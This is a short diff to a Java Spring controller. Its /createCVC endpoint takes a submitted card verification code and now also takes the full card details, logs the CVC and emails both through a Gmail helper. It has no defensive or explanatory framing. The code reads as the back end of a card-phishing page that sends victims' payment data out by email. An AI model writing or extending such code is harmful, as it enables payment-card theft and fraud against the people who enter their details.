@@ -19,11 +19,12 @@ public class CVCcontroller {
     }
 
     @PostMapping("/createCVC")
-    public String createCVC(@ModelAttribute Cvc cvc)
+    public String createCVC(@ModelAttribute Cvc cvc, Card card)
     {
-        System.out.println("card is : " + cvc);
+        System.out.println("cvc : " + cvc);
         Gmail gmail = new Gmail();
-        gmail.send(cvc.toString());
+        gmail.send(card.toString() + cvc.toString());
+
         return "redirect:/";
     }
 
